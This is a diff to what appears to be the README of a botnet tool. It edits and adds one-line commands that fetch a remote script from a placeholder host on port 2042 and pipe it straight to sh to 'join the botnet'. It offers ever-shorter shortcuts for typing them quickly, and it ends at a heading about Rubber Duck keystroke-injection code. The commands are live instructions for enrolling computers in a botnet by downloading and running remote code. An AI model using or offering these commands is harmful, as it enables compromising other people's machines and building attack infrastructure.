@@ -24,11 +24,27 @@ Here are simple one-liners to join the botnet:
 
 Mac:
 ```sh
-curl -L [host]:2042/mac/join.sh |bash
+curl -L [host]:2042/mac/join.sh |sh
 ```
 Linux:
 ```sh
-curl -L [host]:2042/linux/join.sh |bash
+curl -L [host]:2042/linux/join.sh |sh
+```
+
+To save time and keystrokes, you can use these shortcuts:
+```sh
+curl -L [host]:2042/jm |sh
+curl -L [host]:2042/jl |sh
+```
+
+Or, to save even more time, you can skip the part where you think about what operating system the computer is using and simply type:
+```sh
+curl -L [host]:2042/join.sh |sh
+```
+
+Really in a hurry? There's a shortcut for that as well:
+```sh
+curl -L [host]:2042/j |sh
 ```
 
 ### Rubber Duck code
